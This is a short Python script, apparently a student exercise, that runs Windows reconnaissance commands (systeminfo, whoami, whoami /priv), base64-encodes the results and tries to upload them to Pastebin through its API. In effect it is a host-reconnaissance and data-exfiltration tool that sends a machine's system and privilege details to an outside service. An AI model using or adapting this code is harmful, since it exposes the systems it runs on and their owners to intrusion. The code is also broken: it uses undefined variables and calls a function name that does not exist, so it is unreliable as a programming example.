#Nama   : Adam Fadli Fadilah Armyn
#NIM    : 2301915380

import os
import requests
import subprocess
import base64

def upload_pastebin(data):

    url = 'https://pastebin.com/api/api_post.php'

    api_info={
        'api_dev_key' : 'Masukkan API disini',
        'api_paste_code' : data_64,
        'api_paste_name' : "result",
        'api_option' : 'paste'
    }

    try:
        req = requests.post(url,data=api_info)
        print("Uploaded: ",xxxx.text)
    except:
        print(Error)

def os_checking():
    run = ["systeminfo","whoami","whoami /priv"]
    res=[]

    for x in run:
        tp = subprocess.Popen(args=x,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        
        str,error=tp.communicate()

        if error !=b'':
            res.append(x)
            res.append(error.decode())
        else:
            res.append(str.decode())
    
    res = "\n".join(res)
    
    upload(base64.b64encode(res.encode()))

def main():
    os_checking()

if __name__ == '__main__':
    main()
